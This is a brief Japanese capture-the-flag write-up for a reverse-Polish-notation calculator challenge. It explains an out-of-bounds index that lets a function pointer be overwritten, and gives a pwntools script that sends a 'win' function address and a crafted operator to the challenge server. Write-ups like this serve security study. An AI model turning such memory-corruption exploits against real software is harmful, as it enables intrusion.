# ofd
四則演算ができる逆ポーランド記法の電卓．

ソースコードを読むと，`struct Calculator`の`b`と`op`が連続しており，`op_to_index`で負値を返せるので，`b`に呼び出したい 関数のアドレスを入れ，`op_to_index`が`-1`を返すようにすれば勝ち．

```python
#!/usr/bin/env python3
from pwn import *
context.log_level = 'error'
io = remote('rpn.chal.ipfctf2021.cf', 4002)

for _ in range(3):
    io.readline()

win_addr = 0x004011f6
io.sendline("10 %ld" %(win_addr))

op = chr(ord('*') - 1)

io.sendline(op)
io.readline()
io.readline()
io.readline()
print(io.readline().decode('utf-8', 'ignore'), end='')
```

